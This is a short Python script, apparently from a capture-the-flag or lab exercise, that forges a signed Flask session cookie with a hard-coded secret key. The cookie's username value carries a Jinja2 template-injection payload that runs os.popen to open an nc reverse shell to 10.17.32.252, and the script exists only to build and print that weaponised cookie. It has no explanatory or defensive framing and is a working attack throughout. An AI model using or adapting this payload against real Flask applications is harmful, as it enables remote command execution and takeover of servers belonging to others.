import requests
import sys
import zlib
from itsdangerous import base64_decode
import ast
from flask.sessions import SecureCookieSessionInterface

cookie_data = '{"auth":"True", "username":"{{config.__class__.__init__.__globals__[\'os\'].popen(\'mkfifo /tmp/ZTQ0Y; nc 10.17.32.252 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y\').read()}}"}'
secret_key = "d0ed883395f400fab54b1cd17b433c3a"

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        print(session_cookie_structure)
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)

    
cookie_new = encode(secret_key, cookie_data)
print(cookie_new)